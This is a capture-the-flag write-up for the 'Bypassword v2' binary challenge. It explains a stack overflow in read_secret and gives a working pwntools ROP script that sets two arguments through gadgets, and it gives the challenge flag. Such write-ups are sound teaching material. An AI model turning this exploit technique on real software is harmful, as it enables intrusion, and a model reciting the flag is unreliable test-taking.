# Bypassword v2

## Solution
Like `bypassword v1`, we are given only the executable.
This time, when we look at it in Ghidra, we see that `read_secret` has two necessary parameters.
```c
void read_secret(long param_1,long param_2)
```
We can also see that 76 bytes are now read into that same 32 byte buffer.
```c
fgets(input,76,stdin);
```
Using pwntools, we can see that there are a `pop rdi ; ret` and `pop rsi ; ret` gadgets. 
Since those two registers store the first two parameters when a function is called, all we need to do is call those gadgets and have them set to `0xdeadbeef` and `0x1337c0de` respectively
before jumping to `read_secret`.

## Script
```py
from pwn import *

exe = ELF("./bypassword_v2")
rop = ROP(exe)

#p = process("./bypassword_v2")
p = remote("address",30432)

p.sendline(b'2')

payload = b'a'*0x28
payload += p64(rop.rdi.address)
payload += p64(0xdeadbeef)
payload += p64(rop.rsi.address)
payload += p64(0x1337c0de)
payload += p64(exe.symbols['read_secret'])

p.recvuntil(b'password')
p.sendline(payload)

p.interactive()
```

## Flag
`HTB{r3t_2_w1n_w1th_4rg5_41nt_54f3}`